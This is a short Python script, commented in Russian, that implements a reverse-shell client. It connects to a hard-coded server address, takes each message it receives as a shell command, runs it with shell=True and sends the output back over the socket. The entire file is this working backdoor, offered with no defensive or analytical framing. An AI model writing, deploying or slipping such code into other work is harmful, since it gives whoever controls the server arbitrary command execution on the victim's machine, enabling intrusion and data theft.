import socket
import os
import subprocess
import asyncio
async def client(host, port):
  # подключаемся к нашему серверу
  reader, writer = await asyncio.open_connection(host, port)
  # ждем ответа сервера(обрабатываем по 100 байт данных)
  while True:
    data = await reader.read(100)
    if not data:
      break
    # получаем команду и выводим в командную строку
    result = subprocess.run(data.decode(), shell=True, capture_output=True, text=True)
    # закидываем в буфер
    writer.write((result.stdout if result.stdout else f"Ошибка!: {result.stderr}").encode())
    # отправляем сокету и чистим бувер
    await writer.drain()

if __name__ == "__main__":
  asyncio.run(client('127.0.0.1', 65432))
